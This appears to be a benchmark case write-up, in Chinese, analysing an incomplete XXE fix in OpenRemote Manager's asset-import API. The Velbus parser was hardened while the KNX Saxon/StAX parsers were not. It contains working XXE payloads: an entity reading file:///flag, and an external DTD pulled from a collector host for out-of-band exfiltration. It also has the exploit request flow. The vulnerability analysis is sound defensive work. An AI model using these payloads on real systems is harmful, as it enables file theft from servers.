# OpenRemote：Velbus 换了安全 DocumentBuilder，KNX 的 Saxon / XMLInputFactory 没换

- Case：`PCBV2-0159`
- 产品：OpenRemote Manager。运行时是官方镜像 `openremote/manager:1.22.0` + Keycloak + Postgres，走产品自己的 `POST /api/{realm}/agent/assetImport/{agentId}`。不是抽出来的 XML 解析器。
- 链：CVE-2026-40882 / GHSA-g24f-mgc3-jwwc（1.21.0 → 1.22.0）→ CVE-2026-54640 / GHSA-7v6w-c3f4-9wpq（1.22.0 → 1.24.2，commit `c28d3c60`）
- GHSA-7v6w-c3f4-9wpq 标题即 *Incomplete fix for CVE-2026-40882*。正文：*The fix for CVE-2026-40882 addressed only the Velbus asset import handler. The KNX asset import handler (`KNXProtocol`) … retains two unprotected XML parsing calls.*

根因不只是「漏了一个协议」。检查（`createSecureDocumentBuilderFactory`）插在 **Velbus** 的 `startAssetImport` 上；真正解析用户文件的，在同一条 HTTP 导入 API 下还有 **KNX** 的 Saxon `TransformerFactoryImpl` 和 `XmlInputFactory.newInstance()`。安全工厂已经存在于同一进程，KNX 没有调用。下面按请求走进去。

平台 residual 打的是 KNX，不是另一条无关的 Manager API。它和 incomplete-fix 链一致：同一导入端点、**兄弟协议解析器**。seed 的 in-band 文件读（Velbus Caption）和 residual 的 OOB DTD（KNX `0.xml`）是两种 XXE 形态，sink 都是「导入路径上未加固的 XML 引擎读 `file://` / 外网 DTD」。

---

## 这块功能本来在干什么

管理员给某种 Agent 上传工程文件，Manager 解析后生成资产树。HTTP 入口只有一个：

```http
POST /api/master/agent/assetImport/{agentId}
Authorization: Bearer <keycloak>
Content-Type: application/json

{"name":"VelbusProject.vlp","contents":"<base64>","binary":true}
```

`AgentResourceImpl.doProtocolAssetImport` 按 agent 类型把 `byte[]` 交给该协议的 `startAssetImport`。Velbus TCP Agent 走 `AbstractVelbusProtocol`；KNX Agent 走 `KNXProtocol`。设计意图：文件是厂商工程格式（Velbus XML / ETS `.knxproj` ZIP），解析结果变成 Thing 资产，**不应**让 JVM 去读 `/flag` 或对内网发 HTTP。成功穿越之后的效果是：**XML 引擎解析外部实体，把服务器文件读进资产名，或把外部 DTD 拉到 OOB collector**。

数据流：

```text
登录 Keycloak password grant（/auth 反代）
    → POST /api/master/asset          创建 VelbusTCPAgent 或 KNXAgent
    → POST /api/master/agent/assetImport/{id}
         doProtocolAssetImport(fileData)
              Velbus：AbstractVelbusProtocol.startAssetImport
                   V0：DocumentBuilderFactory.newInstance().parse(xml)
                   V1：createSecureDocumentBuilderFactory()  ← 只挂在这里
                   Caption.getTextContent() → 资产名
              KNX：KNXProtocol.startAssetImport
                   ZIP 里找 */0.xml
                   Saxon TransformerFactoryImpl.transform(StreamSource(xml))
                   XmlInputFactory.newInstance().createXMLStreamReader(xml)
                   datapoints.load → 资产名
    → 导入响应或 OOB collector 出现 PCBFLAG_...
```

需要已登录（PR:L，不必管理员）。Velbus TCP Agent 的 `doStart` 必须能连上一个 TCP 口（本 case 用 collector:8000），否则协议实例注册失败、导入走不到解析。KNX 对网关不可达会重试，仍能注册。

导入 JSON 的 `contents` 是工程文件的 base64。Velbus 是一份 XML（`.vlp`）；KNX 是 ZIP（`.knxproj`），里面才是 `P-*/0.xml`。HTTP 层不看文件格式，只按 agent 类型分发 `byte[]`。所以「我们修了导入 XXE」若只改 Velbus 的 parse，对已经能创建 KNXAgent 的用户等于没修这条 API。

---

## 原始漏洞：Velbus 默认 DocumentBuilder 解析用户 XML（CVE-2026-40882，1.21.0）

tag 1.21.0 的 `AbstractVelbusProtocol.startAssetImport`（GHSA-g24f-mgc3-jwwc 引用的片段）：

```java
String xmlStr = new String(fileData, StandardCharsets.UTF_8);
xmlDoc = DocumentBuilderFactory
    .newInstance()
    .newDocumentBuilder()
    .parse(new InputSource(new StringReader(xmlStr)));
// ...
String name = module.getElementsByTagName("Caption").item(0).getTextContent();
```

JDK 默认允许 DTD 和外部一般实体。seed 在 Velbus 工程前加：

```xml
<!DOCTYPE Project [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
...
<Caption>PCBFLAG:&xxe;</Caption>
```

parse 时解析 `file:///flag`，`getTextContent()` 把内容当成模块名返回给导入 API。目标文件须短于 1023 字符（advisory）。这就是 v0 + `--seed`。KNX 在 V0 上同样未加固，但 seed 只打 Velbus，因为那是 1.22.0 补丁明确改的那条路。

---

## 维护者改了什么（CVE-2026-40882 修复，1.22.0）

1.22.0 release notes 把 CVE-2026-40882 列为 Velbus Asset Import 的安全更新。tag `1.22.0` 的 `AbstractVelbusProtocol.java` 把 parse 换成：

```java
# V1  1.22.0   （本 case 的目标）
xmlDoc = createSecureDocumentBuilderFactory()
    .newDocumentBuilder()
    .parse(new InputSource(new StringReader(xmlStr)));

protected DocumentBuilderFactory createSecureDocumentBuilderFactory() throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
    factory.setFeature(DISALLOW_DOCTYPE_DECL, true);
    factory.setFeature(EXTERNAL_GENERAL_ENTITIES, false);
    factory.setFeature(EXTERNAL_PARAMETER_ENTITIES, false);
    factory.setFeature(LOAD_EXTERNAL_DTD, false);
    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
    factory.setXIncludeAware(false);
    factory.setExpandEntityReferences(false);
    return factory;
}
```

`disallow-doctype-decl` 让 seed 的 `<!DOCTYPE ... ENTITY ...>` 在 Velbus 路径上直接失败。这就是 v1 + `--seed` 退出码 10。

同一 tag 的 `KNXProtocol.startAssetImport` **一行安全 feature 都没设**（见下一节）。补丁默认了两件事：

1. 「资产导入 XXE」等于 Velbus 那一处 `DocumentBuilderFactory`。
2. 安全工厂只要存在于 Velbus 文件里就够了。

第二点不成立。同一接口 `ProtocolAssetImport.startAssetImport` 还有别的实现。更关键的是：KNX 用的不是 DocumentBuilder，安全工厂即使 public 也套不上去，除非有人在 KNX 里调用等价的 Saxon / StAX 加固。

---

## 消毒之后，导入字节怎么接到 KNX 解析器上

HTTP 层不管协议。agent 类型是 KNX 时，同一 `fileData` 进入 `KNXProtocol.startAssetImport`（tag `1.22.0` 原文）：

```java
zin = new ZipInputStream(new ByteArrayInputStream(fileData));
// 找到名字以 /0.xml 结尾的条目
TransformerFactory tfactory = new net.sf.saxon.TransformerFactoryImpl();
Transformer transformer = tfactory.newTransformer(new StreamSource(new StringReader(xsd)));
transformer.setURIResolver(new ETSFileURIResolver(fileData));
String xml = IOUtils.toString(zin, StandardCharsets.UTF_8);
transformer.transform(new StreamSource(new StringReader(xml)), new StreamResult(writer));
xml = writer.toString();
try (final XmlReader r = XmlInputFactory.newInstance()
        .createXMLStreamReader(new StringReader(xml))) {
    datapoints.load(r);
}
```

Velbus 那套 `createSecureDocumentBuilderFactory` **不会被调用**。Saxon 默认解析源文档里的外部 DTD / 实体；Calimero `XmlInputFactory.newInstance()` 不设 `SUPPORT_DTD=false`、不设 `IS_SUPPORTING_EXTERNAL_ENTITIES=false`。advisory 把这两处标成 XXE stage 1 / stage 2。

`transformer.setURIResolver(new ETSFileURIResolver(fileData))` 是为了让 XSLT 从同一个 ZIP 里解析相对 URI，**不是**安全阀：它不禁止 `SYSTEM "http://collector:8000/evil.dtd"` 这种绝对外部标识。`LOG.warning(xml)` 在 1.22.0 还会把用户 XML 打进日志（V2 commit 顺手 *Don't log potentially sensitive information*）。

找 `0.xml` 的循环是 `zipEntry.getName().endsWith("/0.xml")`。ETS 工程把项目文件放在 `P-xxxx/0.xml`。residual 只改这一条目，其余 ZIP 成员原样拷回，好让 XSLT / Calimero 仍认这是一份工程。

过滤器（Velbus）刚看过的是「这份 XML 能不能带 DOCTYPE」；KNX 看到的是另一份 ETS `0.xml`、另一套引擎。两套语义中间没有「所有 ProtocolAssetImport 必须用安全工厂」的集中谓词。

本 case residual 用外部 DTD：

```xml
<?xml ...?>
<!DOCTYPE KNX SYSTEM "http://collector:8000/evil.dtd">
```

Saxon transform 拉取 DTD。collector 在 compose 网络内提供 `evil.dtd`，DTD 再声明 `file:///flag` 的实体，把内容送回 OOB 口（或让后续 StAX 展开）。金丝雀出现在 collector 记录里，依据是这次 **KNX 解析器出网/读盘**，不是 Velbus Caption 反射。

seed 是 in-band：实体展开进 `<Caption>`，导入 HTTP 响应里的资产名带 flag。residual 改 OOB，是因为 KNX 的 XSLT / datapoint 名不一定把实体文本反射回 API body；advisory 的 `Exploit.java` 证明两段解析器都会解析外部实体。平台用 collector 观察「JVM 是否去拉了 DTD / 读了 `/flag`」，效果通道仍是 XXE，不是另一个漏洞类。

---

## 仓库里已经有更强的检查，KNX 没用

同一 1.22.0 进程里已经有完整的 XXE 关闭清单：

| 实现 | 解析器 | 是否调用 `createSecureDocumentBuilderFactory` |
|---|---|---|
| `AbstractVelbusProtocol.startAssetImport` | `DocumentBuilderFactory` | 是（CVE-2026-40882） |
| `KNXProtocol.startAssetImport` | Saxon + `XmlInputFactory` | **否** |

`XMLConstants.FEATURE_SECURE_PROCESSING`、`ACCESS_EXTERNAL_DTD=""` 对 `TransformerFactory` 同样适用；V1 的 KNX 代码创建 `new TransformerFactoryImpl()` 后立刻 `newTransformer`，没有 `setAttribute` / `setFeature`。JAXP 里等价于 Velbus 那九条的 StAX 写法是：

```java
XMLInputFactory f = XMLInputFactory.newInstance();
f.setProperty(XMLInputFactory.SUPPORT_DTD, false);
f.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
```

1.22.0 的 `XmlInputFactory.newInstance().createXMLStreamReader(...)` 链式调用，中间没有 `setProperty`。不是仓库里没有更好的谓词，是 **KNX 没用**。

GHSA 自己的对比表就是这两行：Velbus DTD disabled ✅，KNX ❌。Velbus 工厂甚至 `setExpandEntityReferences(false)`；KNX 的两段解析器默认都展开。

---

## 这个补丁挡住了什么、没挡住什么

- Velbus V1：`disallow-doctype-decl` → seed 的内部实体失败
- KNX V1：用户 ZIP 里的 `0.xml` 仍进 Saxon 和 StAX

同一 HTTP 路径、换一个 agent 类型，就能绕过「我们修了导入 XXE」的声明。这不是偶然的旁路，而是 advisory 定义的 incomplete-fix。

平台 `verify.sh --residual` 创建 KNXAgent，上传改过 `0.xml` 的 `.knxproj`。它打的就是这条兄弟解析器，**不是**例如 Rules 或 User API 那种不同 sink。和 0143 那种「同一 open、换 path 写法」相比，这里换的是 **同一导入 API 下的另一个 `startAssetImport` 实现**。

---

## 残余仍然走产品导入 API（CVE-2026-54640）

没有换 URL 模板、没有换鉴权。还是：

```http
POST /api/master/agent/assetImport/{knxAgentId}
```

字节是 ETS ZIP，不是 Velbus XML。V1 的 Velbus 工厂照样存在、照样不参与这次调用；Saxon 解析外部 DTD；collector 观察到 flag。公开 PoC（advisory 里的 `Exploit.java`）用同一组库版本分别打 XMLInputFactory 和 Saxon 两段。

seed 被挡住只说明「Velbus DocumentBuilder 不再展开实体」，不说明「导入 API 不能再让 JVM 读 `/flag`」。

平台 residual 走的就是这件事：同一 `assetImport` HTTP，另一个 protocol handler。不要把它理解成「换了一个无关的 Manager 路由」——路径模板没变，变的是 `{agentId}` 对应的实现类。

---

## 后来又补了什么（CVE-2026-54640，1.24.2）

commit `c28d3c60` 在 `KNXProtocol.java` 上：硬化 Transformer、在交给 Calimero 之前先做安全 XML 校验（advisory：*Harden transformer and validate XML before passing it to Calimero*）。1.24.2 release notes 点名 CVE-2026-54640。Maven `io.openremote:openremote-agent` 记为 fixed 1.24.2。

对本 case 的 OOB DTD residual，加固后的 factory 拒绝外部 DTD，collector 不应再读到 flag。公开建议是升级到含该 commit 的构建。本 benchmark 镜像停在 1.22.0 作为 V1；V2 若要用需 1.24.2 的 manager 镜像。

V2 的测试 `KNXImportXXETest.groovy` 是和补丁一起加的，专门断言 KNX 导入不再解析外部实体。1.22.0 没有这份测试——Velbus 修完时没有回归到「别的 ProtocolAssetImport」。这和源码上「安全工厂只出现在 Velbus 文件」是同一件事。

即便如此，这仍然是「每个协议自己记着关 DTD」。新的 `ProtocolAssetImport` 实现若再忘一次，还会是同一类洞。

---

## 从这条链还能看出什么

**维护者改错了哪一层。**  
他们改的是 Velbus 文件里的 DocumentBuilder。真正还在解析不可信 XML 的是 KNX 的 Saxon/StAX。V2 才把同类 feature 接到 KNX，没有在 `doProtocolAssetImport` 入口统一消毒。

**不是没有更好的谓词。**  
`createSecureDocumentBuilderFactory` 的九条 feature/attribute 已经写好。从 1.22.0 的 Velbus diff 只能看到「parse 换了工厂」；要判断是否闭合，必须列出所有 `startAssetImport` 实现。

**同一 HTTP 导入、同一 `byte[] fileData`，只换了 Agent 类型。**  
任何能创建 KNXAgent 并调用导入的已登录用户，在 1.22.0 上都吃未加固的那两处解析。

**Velbus 还要求 TCP 对端，KNX 不要求。**  
这只影响谁更容易把协议实例拉起来，不改变「KNX 解析器未加固」这一事实。collector 同时干两件事：给 Velbus `doStart` 一个 TCP 口，以及给 KNX residual 一个 DTD 下载点。seed 不需要 collector 的 HTTP DTD 路由；residual 不需要 Velbus 工程文件。同一 compose 网络，两条导入链。

---

## 版本、入口、参考

| | 镜像 | Velbus `startAssetImport` | KNX `startAssetImport` | Velbus `file:///flag` seed | KNX 外部 DTD residual |
|---|---|---|---|---|---|
| V0 | 1.21.0 | 默认 DocumentBuilder | 未加固 Saxon/StAX | 资产名读到金丝雀 | （不必） |
| V1 | 1.22.0 | `createSecureDocumentBuilderFactory` | **仍未加固** | parse 失败 | collector 读到金丝雀 |
| V2 | 1.24.2 | 同上 | commit `c28d3c60` 硬化 | 挡 | 挡 |

- Web：`POST /api/master/agent/assetImport/{agentId}`（先 Keycloak token，再按类型建 Agent）
- V1 blob：tag [`1.22.0` KNXProtocol.java](https://github.com/openremote/openremote/blob/1.22.0/agent/src/main/java/org/openremote/agent/protocol/knx/KNXProtocol.java) `startAssetImport`；同 tag [`AbstractVelbusProtocol.java`](https://github.com/openremote/openremote/blob/1.22.0/agent/src/main/java/org/openremote/agent/protocol/velbus/AbstractVelbusProtocol.java) `createSecureDocumentBuilderFactory`
- [GHSA-g24f-mgc3-jwwc](https://github.com/openremote/openremote/security/advisories/GHSA-g24f-mgc3-jwwc) / [CVE-2026-40882](https://nvd.nist.gov/vuln/detail/CVE-2026-40882)
- [GHSA-7v6w-c3f4-9wpq](https://github.com/openremote/openremote/security/advisories/GHSA-7v6w-c3f4-9wpq) / [CVE-2026-54640](https://nvd.nist.gov/vuln/detail/CVE-2026-54640)
- 修复提交：[c28d3c60](https://github.com/openremote/openremote/commit/c28d3c60ebc2da68d9b6c4a6d7a5ad875a255ee9)；Velbus 侧见 1.22.0 changelog
